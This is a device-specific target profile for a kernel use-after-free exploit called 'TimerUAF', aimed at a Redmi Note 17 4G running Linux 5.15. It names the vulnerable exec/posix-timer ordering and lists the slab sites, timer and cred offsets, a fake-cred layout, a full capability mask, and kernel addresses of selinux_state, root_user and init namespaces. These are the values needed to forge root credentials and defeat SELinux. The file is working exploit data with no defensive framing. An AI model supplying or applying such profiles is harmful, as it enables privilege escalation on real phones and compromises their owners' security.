# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Redmi Note 17 4G (zephyr)
# Kernel: 5.15.194-android13-8-00015-gf5526d1116e5-ab15004895 (4K pages)
#
# Every constant below is derived from that factory boot.img.  5.15 links with
# the __pi_ kernel VA base, so text and data live at 0xffffffc008...
#   init_posix_timers   kmem_cache_create_usercopy("posix_timers_cache", 0x108,
#                       ...) -> timer_alloc 0x108
#   do_timer_create     bl kmem_cache_alloc at 0xffffffc00827ecd8, returns to
#                       0xffffffc00827ecdc (x0 = posix_timers_cache)
#   copy_process        calls dup_task_struct, whose
#                       bl kmem_cache_alloc_node at 0xffffffc008132d10
#                       returns to 0xffffffc008132d14 (x0 = task_struct_cachep)
#                       -> low21 0x132d14
#   fork_init() passes 0x1200 to kmem_cache_create_usercopy("task_struct"),
#   and there is no task_struct_vendor_size_setup() on 5.15, so
#   task_alloc_bytes stays 0x1200.
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers().
release = "5.15.194-android13-8-00015-gf5526d1116e5-ab15004895"
schema_version = 1
ksu_kmi = "android13-5.15"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# 5.15 frees the order-1 slab through the PCP lists (free_the_page ->
# free_unref_page). The mm_page_free event does fire from free_pcp_prepare,
# but the same PCP path is why the 6.1 profiles additionally gate the
# reclaim burst on /proc/slabinfo; use the same conservative gate here.
pcp_free = 1

# do_timer_create -> kmem_cache_alloc(posix_timers_cache)
timer_site = 0xffffffc00827ecdc
timer_alloc = 0x108
# The `it` union (k_itimer.it) is at +0x78; its `cpu` member is a
# struct cpu_timer, whose first field `node` is at +0, so the timerqueue
# rb_node sits at +0x78.
timer_node_off = 0x78

# cred_jar: kmem_cache_create("cred_jar", 0xb0, 0,
#   SLAB_PANIC|SLAB_ACCOUNT|SLAB_HWCACHE_ALIGN) -> object 0xc0
cred_req = 0xb0
cred_alloc = 0xc0
cred_size = 0xb0
# 5.15 cred uses a 4-byte atomic_t usage, so every field shifts down by 8.
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc00adbad88
panic_on_warn = 0xffffffc00ab0add0

# task_struct / cred layout (BTF)
task_cred_off = 0x798
copy_process_low21 = 0x132d14
task_alloc_bytes = 0x1200

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc00ab32770
init_user_ns = 0xffffffc00acde250
init_ucounts = 0xffffffc00ab33ff0
init_groups = 0xffffffc00ab33b28

# task_security_struct
# Only selinux registers a cred blob here, and it is the first contributor,
# so its offset is 0.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
